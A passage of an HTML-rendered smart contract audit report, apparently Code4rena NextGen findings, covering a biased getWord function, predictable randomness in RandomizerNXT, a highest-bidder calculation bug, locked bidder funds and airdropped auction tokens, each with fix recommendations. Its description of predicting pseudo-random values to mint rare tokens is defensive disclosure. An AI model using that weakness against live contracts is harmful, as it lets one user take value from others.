before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Verify if the function should actually be <code>payable</code> and remove the modifier in case it doesnâ€™t need it. In case the core contract is supposed to send it some value, modify the calling functions to include the corresponding <code>value</code>.</p>\n<h2 id=\"05-getword-returns-the-same-word-for-different-ids\" style=\"position:relative;\"><a href=\"#05-getword-returns-the-same-word-for-different-ids\" aria-label=\"05 getword returns the same word for different ids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] <code>getWord()</code> returns the same word for different ids</h2>\n<p><code>XRandoms::getWord()</code> is used to return â€œrandomâ€ words upon a provided <code>id</code>. But it will return the same word for ids <code>0</code> and <code>1</code>, making the first word have 2x the probability of being returned compared to the others:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">id</span><span class=\"mtk1\">==</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wordsList</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wordsList</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L28-L32\">XRandoms.sol#L28-L32</a></p>\n<p>The <code>if</code> clause is not needed, as the function is expected to be called upon the result of a <code>% 100</code> operation: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/XRandoms.sol#L41-L42\">XRandoms.sol#L41-L42</a>, which will return values [0-99] that can safely be used inside the bounds of the words array.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Replace the <code>if</code> statement with:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  if (id==0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      return wordsList[id];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      return wordsList[id - 1];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return wordsList[id]; </span></span></span></code></pre>\n<h2 id=\"06-predictable-pseudo-random-values-should-be-proposed-by-trusted-roles\" style=\"position:relative;\"><a href=\"#06-predictable-pseudo-random-values-should-be-proposed-by-trusted-roles\" aria-label=\"06 predictable pseudo random values should be proposed by trusted roles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] Predictable pseudo-random values should be proposed by trusted roles</h2>\n<p><code>RandomizerNXT</code> uses predictable pseudo-random values to set the token hash. </p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L57\">RandomizerNXT.sol#L57</a></p>\n<p>This can be used by users to predict the resulting token, and mint the most valuable ones, or with the rarest attributes, taking advantage over other legit users.</p>\n<h3 id=\"recommendation-4\" style=\"position:relative;\"><a href=\"#recommendation-4\" aria-label=\"recommendation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Separate the token hash assignment to a separate function, like the other randomizers do, and only allow trusted roles to execute it to prevent user from abusing it.</p>\n<h2 id=\"07-returnhighestbidder-doesnt-update-the-highbid-attribute-on-its-calculation\" style=\"position:relative;\"><a href=\"#07-returnhighestbidder-doesnt-update-the-highbid-attribute-on-its-calculation\" aria-label=\"07 returnhighestbidder doesnt update the highbid attribute on its calculation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] <code>returnHighestBidder()</code> doesnâ€™t update the <code>highBid</code> attribute on its calculation</h2>\n<p><code>returnHighestBidder</code> may return a different highest bidder to win the auction than the actual highest one.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Note how <code>highBid</code> is always <code>0</code>, and only the <code>index</code> is updated when calculating the highest bidder:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returnHighestBidder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;No Active Bidder&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L92\">AuctionDemo.sol#L92</a></p>\n<p>Compare it to how <code>returnHighestBid()</code> does it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returnHighestBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;          </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;                  </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">index</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">index</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highBid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L71\">AuctionDemo.sol#L71</a></p>\n<h3 id=\"recommendation-5\" style=\"position:relative;\"><a href=\"#recommendation-5\" aria-label=\"recommendation 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Update the <code>highBid</code> value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function returnHighestBidder(uint256 _tokenid) public view returns (address) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 highBid = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 index;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint256 i=0; i&lt; auctionInfoData[_tokenid].length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (auctionInfoData[_tokenid][i].bid &gt; highBid &amp;&amp; auctionInfoData[_tokenid][i].status == true) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               highBid = auctionInfoData[_tokenid][i].bid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                index = i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (auctionInfoData[_tokenid][index].status == true) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                return auctionInfoData[_tokenid][index].bidder;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                revert(&quot;No Active Bidder&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"08-auction-participants-will-have-their-funds-locked-until-nft-is-claimed\" style=\"position:relative;\"><a href=\"#08-auction-participants-will-have-their-funds-locked-until-nft-is-claimed\" aria-label=\"08 auction participants will have their funds locked until nft is claimed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] Auction participants will have their funds locked until NFT is claimed</h2>\n<p>Bidders canâ€™t cancel their bid after the auction ends: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L125\">AuctionDemo.sol#L125</a>.</p>\n<p>They donâ€™t have a method to withdraw their bid if they didnâ€™t win either. Also, they have to wait until the winner or an admin claims the NFT to get their bid back <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116\">AuctionDemo.sol#L116</a>.</p>\n<p>This is an unnecessary lock of users funds.</p>\n<h3 id=\"recommendation-6\" style=\"position:relative;\"><a href=\"#recommendation-6\" aria-label=\"recommendation 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Allow non-winning bidders to withdraw their bids after an auction ends.</p>\n<h2 id=\"09-airdropped-minted-tokens-for-auctions-should-be-transferred-to-a-escrow-contract\" style=\"position:relative;\"><a href=\"#09-airdropped-minted-tokens-for-auctions-should-be-transferred-to-a-escrow-contract\" aria-label=\"09 airdropped minted tokens for auctions should be transferred to a escrow contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] Airdropped minted tokens for auctions should be transferred to a escrow contract</h2>\n<p>Tokens put into auction are first airdropped to a specific <code>_recipient</code> address.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintAndAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, ...)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">airDropTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L282\">MinterContract.sol#L282</a></p>\n<p>Then, they are transferred from that address to the auction winner:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code 